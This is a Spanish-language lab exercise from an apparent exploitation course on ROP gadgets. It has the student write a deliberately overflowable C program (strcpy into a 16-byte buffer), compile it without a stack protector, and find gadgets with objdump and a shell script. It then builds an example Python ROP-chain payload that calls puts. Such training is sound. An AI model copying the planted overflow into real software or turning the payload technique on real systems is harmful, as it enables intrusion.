# Ejercicio 06: ROP Gadgets - Introducción Práctica

## Lectura Previa Obligatoria

Antes de comenzar este ejercicio, asegúrate de haber leído:
- **Lección 08: ROP y Protecciones** (`01-teoria/leccion_08.md`)

En esa lección aprendiste:
- Por qué NX impide ejecutar shellcode en el stack
- Qué es un gadget (instrucciones que terminan en `ret`)
- Cómo una ROP chain encadena gadgets usando el stack
- Cuáles son las protecciones modernas

---

## Objetivos

- Buscar gadgets reales en un binario con objdump
- Identificar gadgets útiles para cargar registros
- Entender cómo se vería una ROP chain en el stack
- Observar la diferencia entre NX activado y desactivado

## Tiempo Estimado

60-75 minutos

## Dificultad

⭐⭐⭐ Intermedio-Avanzado

---

## Parte 1: Crear Binario con Gadgets

```bash
cd ~/SnowCrash/02-practicas/nivel_01

cat > gadgets.c << 'EOF'
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// Funciones que generan código útil en el binario
int suma(int a, int b)  { return a + b; }
int resta(int a, int b) { return a - b; }

void vulnerable(char *entrada) {
    char buffer[16];
    strcpy(buffer, entrada);  // overflow
}

int main(int argc, char **argv) {
    if (argc > 1)
        vulnerable(argv[1]);
    printf("Programa terminó normalmente\n");
    return 0;
}
EOF

# Compilar con NX activado (por defecto) y sin pie para ver direcciones fijas
gcc -g -O0 -fno-stack-protector -no-pie -o gadgets gadgets.c
```

---

## Parte 2: Verificar NX Activado

```bash
checksec ./gadgets
```

Busca en la salida:
```
NX: Enabled
```

Esto confirma que el stack NO es ejecutable. Si intentáramos poner shellcode en el stack y saltar a él, el CPU lo rechazaría.

---

## Parte 3: Buscar Gadgets con objdump

### Ver todo el assembly

```bash
objdump -d -M intel gadgets | head -100
```

### Buscar gadgets tipo "pop reg; ret"

```bash
# Buscar "pop" seguido de "ret" en líneas cercanas
objdump -d -M intel gadgets | grep -B1 "ret" | grep -A1 "pop"
```

### Buscar gadget específico: pop rdi

```bash
objdump -d -M intel gadgets | grep "pop.*rdi"
```

Si aparece, anota la dirección. Ejemplo:
```
400500:  5f    pop    rdi
400501:  c3    ret
```

La dirección del gadget es `0x400500`.

### Buscar ret suelto

```bash
objdump -d -M intel gadgets | grep "retq"
```

Cada `ret` es en sí mismo un gadget mínimo.

---

## Parte 4: Crear Script de Búsqueda

```bash
cat > buscar_gadgets.sh << 'EOF'
#!/bin/bash
binario=$1

echo "=== Gadgets encontrados en: $binario ==="
echo ""

echo "[pop rdi; ret]"
objdump -d -M intel "$binario" | grep -B1 "retq" | grep -A1 "pop.*rdi"

echo ""
echo "[pop rsi; ret]"
objdump -d -M intel "$binario" | grep -B1 "retq" | grep -A1 "pop.*rsi"

echo ""
echo "[pop rdx; ret]"
objdump -d -M intel "$binario" | grep -B1 "retq" | grep -A1 "pop.*rdx"

echo ""
echo "[pop rax; ret]"
objdump -d -M intel "$binario" | grep -B1 "retq" | grep -A1 "pop.*rax"

echo ""
echo "[Todas las instrucciones ret]"
objdump -d -M intel "$binario" | grep -c "retq"
echo "Total de ret encontrados"
EOF

chmod +x buscar_gadgets.sh
./buscar_gadgets.sh ./gadgets
```

---

## Parte 5: Entender el Stack de una ROP Chain

Aunque no ejecutaremos una ROP chain completa aquí, es importante entender cómo se vería en memoria.

Supón que tienes:
- Gadget `pop rdi; ret` en `0x400500`
- La función `puts()` en `0x400430`
- Un string "Hola" en `0x400700`

Una ROP chain para llamar `puts("Hola")`:

```python
from struct import pack

offset = 24  # igual que en ejercicio 04

payload = b"A" * offset               # llenar hasta return address
payload += pack("<Q", 0x400500)        # saltar a gadget "pop rdi; ret"
payload += pack("<Q", 0x400700)        # valor que pop rdi tomará → rdi = 0x400700
payload += pack("<Q", 0x400430)        # saltar a puts() → puts(rdi) → puts("Hola")
```

**Traza de ejecución:**

```
1. vulnerable() retorna → salta a 0x400500 (gadget)
2. pop rdi → rdi = 0x400700 (dirección del string)
3. ret → salta a 0x400430 (puts)
4. puts(rdi) → imprime "Hola"
```

Escribe este script (sin ejecutarlo todavía, solo para ver cómo se construye):

```bash
cat > rop_chain.py << 'EOF'
#!/usr/bin/env python3
from struct import pack

# Estas direcciones son ejemplo - deben verificarse con objdump
gadget_pop_rdi = 0x400500   # pop rdi; ret
puts_addr      = 0x400430   # puts()
string_addr    = 0x400700   # "Hola\n"

offset = 24

payload = b"A" * offset
payload += pack("<Q", gadget_pop_rdi)
payload += pack("<Q", string_addr)
payload += pack("<Q", puts_addr)

print("[*] ROP chain construida")
print("[*] Longitud:", len(payload))
print("[*] Payload:", payload.hex())
EOF
```

---

## Parte 6: Comparar NX Activado vs Desactivado

### Con NX desactivado (como en ejercicio 04)

```bash
gcc -g -O0 -fno-stack-protector -z execstack -no-pie -o gadgets_noNX gadgets.c
checksec ./gadgets_noNX
# NX: Disabled
```

### Con NX activado (por defecto)

```bash
checksec ./gadgets
# NX: Enabled
```

**¿Qué cambia?**

Con NX desactivado: puedes poner shellcode en el stack y saltar a él.
Con NX activado: tienes que usar ROP (saltar a código que ya existe).

El overflow funciona igual en ambos casos. Solo cambia a dónde puedes saltar.

---

## Checkpoints

✅ Completaste cuando:

- [ ] Compilaste gadgets.c con NX activado
- [ ] Verificaste con checksec que NX está habilitado
- [ ] Usaste objdump para buscar gadgets
- [ ] Encontraste al menos un gadget `pop reg; ret`
- [ ] Creaste buscar_gadgets.sh y lo ejecutaste
- [ ] Entiendes cómo se estructura el stack de una ROP chain
- [ ] Entiendes la diferencia entre NX activado y desactivado

---

## Desafío Extra

### Nivel 1: Encontrar la dirección real de un gadget

```bash
objdump -d -M intel gadgets | grep -B2 "retq" | grep -B1 "pop"
```

Anota la dirección exacta de cada gadget que encuentres.

### Nivel 2: Verificar un gadget en GDB

```bash
gdb ./gadgets
(gdb) break main
(gdb) run "hola"
(gdb) x/2i 0x400500   # reemplaza con la dirección de tu gadget
# Debería mostrar:
# 0x400500: pop rdi
# 0x400501: ret
```

### Nivel 3: Instalar ROPgadget y comparar resultados

```bash
pip3 install ropgadget
ROPgadget --binary gadgets
```

Compara los gadgets que encontraste manualmente con los que encuentra ROPgadget automáticamente.

---

## Lecturas Relacionadas

- `01-teoria/leccion_08.md` - Teoría completa de ROP
- `recursos/hints-futuros.md` - ROP avanzado en el siguiente proyecto
- `recursos/objdump-guia.md` - Sección "Búsqueda de Gadgets"

## Siguiente

**Nivel Bonus** - Desafíos que combinan todas las técnicas aprendidas.
